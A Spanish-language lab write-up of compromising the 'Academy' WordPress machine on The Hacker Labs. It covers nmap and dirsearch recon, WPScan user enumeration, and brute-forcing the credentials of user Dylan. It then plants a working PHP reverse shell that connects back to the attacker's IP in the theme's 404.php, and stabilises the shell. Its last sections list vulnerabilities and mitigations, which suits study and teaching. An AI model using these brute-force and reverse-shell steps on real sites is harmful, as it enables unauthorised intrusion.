# Informe de Explotación - Máquina "Academy" (The Hacker Labs)
**IP Objetivo:** IP_DE_LA_MAQUINA
**Fecha:** 23 Julio 2026
**Autor:** Kali (opencode)

---

## 1. RESUMEN EJECUTIVO

Se ha obtenido acceso inicial a la máquina "Academy" comprometiendo un sitio WordPress 6.5.3 mediante fuzzing recursivo, enumeración con WPScan, fuerza bruta de credenciales y explotación del editor de temas para obtener una reverse shell como `www-data`.

**Vectores de ataque utilizados:**
1. `dirsearch -r` → Descubrimiento de `/wordpress` → Configuración `/etc/hosts`
2. WPScan → Enumeración de usuarios y plugins (Elementor)
3. WPScan brute force → Credenciales `Dylan` / `password1`
4. Login `/wp-admin` → Editor de temas → Reverse shell PHP en `404.php`
5. Estabilización de shell → Acceso como `www-data`

**Nota:** La escalada de privilegios a root quedó pendiente para un módulo posterior.

**Cadena de compromiso:** WordPress → Dylan → www-data

---

## 2. RECONOCIMIENTO INICIAL

### 2.1 Descubrimiento de host
```bash
sudo netdiscover -r 10.0.2.0/24
```

**Resultado:** Se localizó la máquina objetivo en la red local.

### 2.2 Escaneo de puertos (Nmap)
```bash
sudo nmap -sV -p- IP_DE_LA_MAQUINA
```

**Resultado:**
| Puerto | Estado | Servicio | Versión |
|--------|--------|----------|---------|
| 22/tcp | Open | SSH | OpenSSH |
| 80/tcp | HTTP | Apache | Apache httpd |

**Por qué:** Identificar superficie de ataque. Web en puerto 80 es vector principal.

---

## 3. ENUMERACIÓN WEB

### 3.1 Fuzzing recursivo de directorios (dirsearch)
```bash
dirsearch -u http://IP_DE_LA_MAQUINA/ -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Resultado:**
- `/wordpress` (código 301, redirección)
- `wp-login.php`
- `wp-content/uploads`
**Por qué:** El flag `-r` activa la enumeración recursiva. Sin recursividad no se habrían descubierto las rutas internas.

### 3.2 Configuración de /etc/hosts
```bash
sudo nano /etc/hosts
```

Añadir la línea:
```
IP_DE_LA_MAQUINA academy.thehackerlabs
```

**Por qué:** WordPress usa el dominio `academy.thehackerlabs`. Sin esta configuración, el navegador y WPScan no resuelven el dominio. La redirección 301 causa que las herramientas fallen.

---

## 4. ENUMERACIÓN CMS (WPScan)

### 4.1 Detección del CMS
```bash
wpscan --url http://academy.thehackerlabs/wordpress
```

**Resultado:**
- WordPress **versión 6.5.3**
- Presencia de `xmlrpc.php`
- Presencia de `readme.html`
- Directorio `wp-content/uploads` accesible

### 4.2 Enumeración de usuarios
```bash
wpscan --url http://academy.thehackerlabs/wordpress -e u
```

**Resultado:** Se enumeraron los usuarios válidos del WordPress.

### 4.3 Enumeración de plugins
```bash
wpscan --url http://academy.thehackerlabs/wordpress --enumerate ap
```

**Resultado:** Se detectó el plugin **Elementor**.

### 4.4 Plugins vulnerables con API Token
```bash
wpscan --url http://academy.thehackerlabs/wordpress --enumerate vp --api-token {API_TOKEN}
```

**Resultado:** Se listaron vulnerabilidades con sus CVEs.

---

## 5. CRACKING DE CREDENCIALES

### 5.1 Fuerza bruta WordPress (WPScan)
```bash
wpscan --url http://academy.thehackerlabs/wordpress --enumerate ap --passwords /usr/share/wordlists/rockyou.txt
```

**Resultado:**
```
Usuario: Dylan
Contraseña: password1
```

**Por qué:** La fuerza bruta es el último recurso. En WordPress se prefiere WPScan frente a Hydra o Burp Intruder. `password1` es una contraseña típica de rockyou.txt.

---

## 6. ACCESO INICIAL

### 6.1 Login al panel de WordPress
```bash
# Acceder a http://academy.thehackerlabs/wp-admin
# Iniciar sesión con: Dylan / password1
```

**Resultado:** Se accedió al panel de administración de WordPress.

### 6.2 RCE: Reverse Shell por editor de temas

**Pasos:**
1. Ir a **Apariencia → Editor de temas**
2. Seleccionar la plantilla **`404.php`**
3. Pegar una **reverse shell PHP**:

```php
<?php
$sock = fsockopen("IP_KALI", 1234);
$proc = proc_open("/bin/bash -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

4. Guardar cambios

### 6.3 Reverse Shell: De HTTP a TCP

**En Kali (listener):**
```bash
nc -lvnp 1234
```

**Disparar la shell:**
Visitar `http://academy.thehackerlabs/wordpress/404.php` en el navegador.

**Resultado:**
```
connect to [IP_KALI] from (UNKNOWN) [IP_MAQUINA] xxxx
bash: no hay control de trabajos en este shell
www-data@academy:~$
```

**Por qué:** El tráfico cambia de HTTP a TCP. Una vez dentro, el WAF (Wordfence) ya no protege. Actúa a nivel de aplicación; dentro solo queda el firewall del sistema.

### 6.4 Estabilización de la shell
```bash
# En la shell reverse
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Ctrl+Z para suspender
# En Kali:
stty raw -echo; fg

# Presionar Enter
whoami
id
```

**Resultado:**
```
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 7. ENUMERACIÓN POST-EXPLOTACIÓN

### 7.1 Verificación de usuario
```bash
whoami
# www-data
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Nota:** La escalada de privilegios a root quedó pendiente para el módulo de escalada. No se obtuvo la flag de root en esta sesión.

---

## 8. CADENA DE ATAQUE COMPLETA

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ CADENA DE EXPLOTACIÓN â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â”‚
â”‚ [1] RECONOCIMIENTO â”‚
â”‚ â”Œâ”€ Nmap â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ Puertos: 22(SSH), 80(HTTP) â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”‚ â”‚
â”‚ â–¼ â”‚
â”‚ [2] ENUMERACIÓN WEB â”‚
â”‚ â”Œâ”€ dirsearch -r â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€ /wordpress (301) â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ Fuzzing recursivo â”‚â”€â”€â”€â”€â–¶â”‚ Redirección a dominio â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”‚ â”‚
â”‚ â–¼ â”‚
â”‚ [3] CONFIGURACIÓN DOMINIO â”‚
â”‚ â”Œâ”€ /etc/hosts â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€ academy.thehackerlabs â”€â”€â”€â”€â” â”‚
â”‚ â”‚ IP → dominio â”‚â”€â”€â”€â”€â–¶â”‚ Resolución DNS local â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”‚ â”‚
â”‚ â–¼ â”‚
â”‚ [4] ENUMERACIÓN CMS â”‚
â”‚ â”Œâ”€ WPScan â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€ WordPress 6.5.3 â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ Versión + plugins â”‚â”€â”€â”€â”€â–¶â”‚ Elementor detectado â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”‚ â”‚
â”‚ â–¼ â”‚
â”‚ [5] CRACKING DE CREDENCIALES â”‚
â”‚ â”Œâ”€ WPScan brute force â”€â”€â”€â” â”Œâ”€ Dylan / password1 â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ rockyou.txt â”‚â”€â”€â”€â”€â–¶â”‚ Credenciales encontradas â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”‚ â”‚
â”‚ â–¼ â”‚
â”‚ [6] ACCESO AL PANEL â”‚
â”‚ â”Œâ”€ /wp-admin â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€ Editor de temas â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ Login con Dylan â”‚â”€â”€â”€â”€â–¶â”‚ 404.php → reverse shell â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”‚ â”‚
â”‚ â–¼ â”‚
â”‚ [7] REVERSE SHELL â”‚
â”‚ â”Œâ”€ nc -lvnp 1234 â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€ www-data shell â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ TCP connection â”‚â”€â”€â”€â”€â–¶â”‚ HTTP → TCP bypass WAF â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”‚ â”‚
â”‚ â–¼ â”‚
â”‚ [8] ESTABILIZACIÓN â”‚
â”‚ â”Œâ”€ python3 pty â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€ Shell estable â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ TTY spawn â”‚â”€â”€â”€â”€â–¶â”‚ Acceso inicial logrado â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”‚ â”‚
â”‚ â–¼ â”‚
â”‚ [9] ESTADO FINAL â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ USER (www-data): Acceso logrado â”‚ â”‚
â”‚ â”‚ ROOT: PENDIENTE (módulo de escalada) â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## 9. VULNERABILIDADES IDENTIFICADAS

| # | Vulnerabilidad | Severidad | Ubicación | Impacto |
|---|----------------|-----------|-----------|---------|
| 1 | Fuerza bruta WordPress sin rate limiting | ALTA | `/wp-login.php` | Acceso al panel administrativo |
| 2 | Contraseña débil (`password1`) | ALTA | Usuario Dylan | Cracking trivial con rockyou.txt |
| 3 | Editor de temas sin restricción | CRÍTICA | `/wp-admin` → Editor de temas | RCE via reverse shell PHP |
| 4 | Plantilla 404.php ejecuta PHP | ALTA | `/wordpress/404.php` | Vehículo para reverse shell |
| 5 | WordPress 6.5.3 potencialmente vulnerable | MEDIA | Core de WordPress | Posibles CVEs conocidos |
| 6 | WAF a nivel de aplicación (Wordfence) | BAJA | Plugin WordPress | Bypass via cambio de protocolo HTTP→TCP |

---

## 10. RECOMENDACIONES DE MITIGACIÓN

1. **Implementar rate limiting en wp-login.php** â€” Bloquear después de N intentos fallidos
2. **Usar contraseñas fuertes** â€” Política de complejidad; `password1` es inaceptable
3. **Restringir acceso al editor de temas** â€” Solo administradores con rol específico
4. **Deshabilitar editor de temas en producción** â€” Añadir `define('DISALLOW_FILE_EDIT', true);` en `wp-config.php`
5. **Mantener WordPress actualizado** â€” Actualizar core, plugins y temas regularmente
6. **Implementar 2FA** â€” Autenticación de dos factores para wp-admin
7. **Usar WAF externo** â€” Cloudflare, Sucuri o similar antes de WordPress
8. **Monitorear logs de WordPress** â€” Alertar sobre intentos de login sospechosos
9. **Implementar Content Security Policy** â€” Restringir scripts ejecutables
10. **Auditar plugins periódicamente** â€” Eliminar plugins no utilizados (Elementor, etc.)

---

## 11. COMANDOS CLAVE UTILIZADOS

```bash
# Reconocimiento
sudo netdiscover -r 10.0.2.0/24
sudo nmap -sV -p- IP_DE_LA_MAQUINA

# Enumeración web
dirsearch -u http://IP_DE_LA_MAQUINA/ -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Configuración dominio
sudo nano /etc/hosts
# IP_DE_LA_MAQUINA academy.thehackerlabs

# Enumeración WordPress
wpscan --url http://academy.thehackerlabs/wordpress
wpscan --url http://academy.thehackerlabs/wordpress -e u
wpscan --url http://academy.thehackerlabs/wordpress --enumerate ap
wpscan --url http://academy.thehackerlabs/wordpress --enumerate vp --api-token {API_TOKEN}

# Brute force
wpscan --url http://academy.thehackerlabs/wordpress --enumerate ap --passwords /usr/share/wordlists/rockyou.txt

# Reverse shell
nc -lvnp 1234
# Visitar http://academy.thehackerlabs/wordpress/404.php

# Estabilización
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

---

## 12. EVIDENCIAS DE COMPROMISO

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ FLAGS OBTENIDAS â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ USER (www-data): Acceso logrado â”‚
â”‚ ROOT: PENDIENTE (módulo de escalada) â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ACCESOS LOGRADOS â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ âœ“ WPScan → Enumeración de usuarios y plugins â”‚
â”‚ âœ“ Brute force → Dylan / password1 â”‚
â”‚ âœ“ Login wp-admin → Panel de administración â”‚
â”‚ âœ“ Editor de temas → Reverse shell PHP en 404.php â”‚
â”‚ âœ“ Shell www-data estabilizada con python3 pty â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ NOTA â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ La escalada de privilegios a root NO fue completada â”‚
â”‚ en esta sesión. Queda pendiente para un módulo posterior. â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

**FIN DEL INFORME**

→
→

→

